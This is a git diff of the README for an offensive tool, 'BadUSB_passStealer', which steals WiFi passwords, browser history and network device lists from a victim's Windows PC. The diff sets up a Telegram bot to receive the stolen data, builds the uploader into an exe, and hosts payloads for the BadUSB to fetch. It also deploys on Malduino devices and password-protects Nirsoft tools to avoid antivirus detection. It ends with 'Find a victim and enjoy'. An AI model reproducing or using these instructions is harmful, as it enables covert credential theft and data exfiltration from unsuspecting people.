@@ -7,6 +7,8 @@ This **script** allows you to steal the following **information** :
 * **WiFi** passwords;
 * Browser **history** from the last 7 days;
 * The list of all **devices** that are **connected to victim's network**;
+### Pay attention Arduino users !
+I stopped upgrading .ino scripts, if you want you can convert Ducky Scripts [here](https://d4n5h.github.io/Duckuino/)
 ### NB n°1 (for arduino BadUSB)
 Sometimes, you will see something like this : 
 ``` 
@@ -37,10 +39,63 @@ When you plug the BadUSB in a PC you  have to wait for the caps lock to flash to
 
 2. Install **Arduino software** [here](https://www.arduino.cc/en/software) (if you use a BadUSB which is based on arduino);
 
-3. Have a **Gmail** account and enable **less secure app** [here](https://www.google.com/settings/security/lesssecureapps);
+3. Have a Telegram account;
 
-4. Have a victim with **Windows OS** installed in his PC;
-## Install
+4. Have latest version of python installed on your PC;
+
+5. Have latest version of pip installed on your PC;
+
+6. Have a victim with **Windows OS** installed in his PC;
+# Install latest version of Python and Pip
+## Python
+1. Download latest python version (installer 64-bit or 32-bit) [here](https://www.python.org/downloads/windows/);
+2. Now run the installer
+3. Select "Add python.exe to PATH" checkbox and then click on "install now";
+## Pip
+1. Launch a powershell prompt and run the following command to download get-pip.py :
+```
+curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
+```
+2. Then run the following command to install pip :
+```
+python get-pip.py
+```
+# Setup a telegram bot to upload files (only for Rubber Ducky, Malduino W and Arduino users)
+## Create a telegram bot
+1. Open you browser and go to this [link](https://web.telegram.org/) and login;
+
+2. Search for the @BotFather username in your Telegram application;
+
+3. Click Start to begin a conversation with @BotFather
+
+4. Send /newbot to @BotFather.;
+
+5. Then send your bot’s name to @BotFather.;
+
+6. Then send your bot’s username to @BotFather. BotFather will respond :
+> Done! Congratulations on your new bot. You will find it at t.me/BOT_USERNAME. You can now add a description, about section and profile picture for your bot, see /help for a list of commands. By the way, when you’ve finished creating your cool bot, ping our Bot Support if you want a better username for it. Just make sure the bot is fully operational before you do this. 
+Use this token to access the HTTP API:
+API_ACESS_TOKEN
+For a description of the Bot API, see this page: https://core.telegram.org/bots/api
+
+7. Now begin a conversation with your bot by clicking on the t.me/BOT_USERNAME link in BotFather's response and click Start. Now your bot will appear in your chat list;
+## Get a Telegram API access token
+Your Telegram API access token is the BotFather's response !
+## Get your Telegram chat ID
+1. Paste the following link in your browser. Replace API_ACCESS_TOKEN with the API access token that you identified or created in the previous section :
+```
+https://api.telegram.org/bot<API-access-token>/getUpdates?offset=0
+```
+
+2. Send a message to your bot in the Telegram application. The message text can be anything. Your chat history must include at least one message to get your chat ID.
+
+3. Refresh the API tab.
+
+4. Identify the numerical chat ID by finding the id inside the chat JSON object. In the example below, the chat ID is 123456789.
+```
+"message":{"message_id":2,"from":{"id":123456789,"is_bot":false,"first_name":"user","language_code":"en"},"chat":{"id":123456789,"first_name":"user","type":"private"},"date":1696077493,"text":"Hi"}}]}
+```
+## Install for Rubber Ducky Malduino W and Arduino BadUSB
 1. Download this repository;
 
 **Linux :**
@@ -50,14 +105,53 @@ cd BadUSB_passStealer
 ```
 **Windows :** Click on green button on right top of main page. Then click on "Download Zip" and extract zip file.
 
-2. Replace your mail and password [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/ciaoV2.ps1) at line 16, 18, 19;
+2. Replace TOKEN and CHAT_ID with your personal Telegram token and chat_id [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/telegram_uploader.py) at line 6 and 7;
 
-3. Replace link in [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) at line 85 or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) at line 28;
+3. Convert telegram_uploader.py in exe file with this command :
+```
+pip install pyinstaller
+pyinstaller --onefile -w telegram_uploader.py
+```
 
-4. Put the .ino or .txt file in your **BadUSB**;
+4. [Upload](https://github.com/tuconnaisyouknow/BadUSB_passStealer#how-to-set-a-link-for-wget-the-script-%EF%B8%8F) your files (ciaoV2_upload.ps1, fin_upload.ps1, telegram_uploader.exe) to download them;
 
-5. Find a victim and enjoy !
-## Requirments for victim PC
+5. Replace LINK [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/upload/BadUSB_passstealer_upload.txt) with ciaoV2_upload.ps1 link at line 53;
+
+6. Replace LINK [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/upload/ciaoV2_upload.ps1) with telegram_uploader.exe at line 15;
+
+7. Put the .ino or .txt file in your **BadUSB**;
+
+8. Find a victim and enjoy !
+## Install for Malduino 2 BadUSB (with mass storage)
+**NB** : You can upgrade firmware also on Malduino 1 !
+**NB 2** : MMS = Malduino Mass Storage
+1. Download this repository;
+
+**Linux :**
+```
+git clone https://github.com/tuconnaisyouknow/BadUSB_passStealer
+cd BadUSB_passStealer
+```
+**Windows :** Click on green button on right top of main page. Then click on "Download Zip" and extract zip file.
+
+2. Upgrade Malduino firmware following this [istructions](https://docs.maltronics.com/devices/malduino-2/firmware-upgrade);
+
+3. Then replace false with true at line 2 in preferences.json file in your MMS. The line has to be like the following :
+```
+"enable_msc": true,
+```
+
+4. In your MMS root directory, crate the following 2 directory : dump/ and passStealer/;
+
+5. Replace TOKEN and CHAT_ID with your personal Telegram token and chat_id [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/telegram_uploader.py) at line 6 and 7;
+
+7. Download 7-Zip Extra: standalone console version, 7z DLL, Plugin for Far Manager [here](https://www.7-zip.org/download.html)
+
+8. Put BadUSB_passStealer.txt in the root directory of your MMS, ciaoV2_storage.ps1 in MMS/passStealer/, fin_storage.ps1 in MMS/passStealer, 7z/ in MMS/passStealer and tools.zip in MMS/passStealer;
+
+9. Find a victim and enjoy !;
+**Explaination** : Nirsoft Tools are encrypted with a password to not be detected by antivirus, so we need 7zip to extract this zip in command line. Dump folder is where all stolen informations will be.
+## Requirments for victim PC (not if you use malduino 2 firmware)
 * Turn off caps lock.
 * Switch the keyboard layout to French (or adapt the code according to your layout).
 # How to set a link for wget the script ⬇️
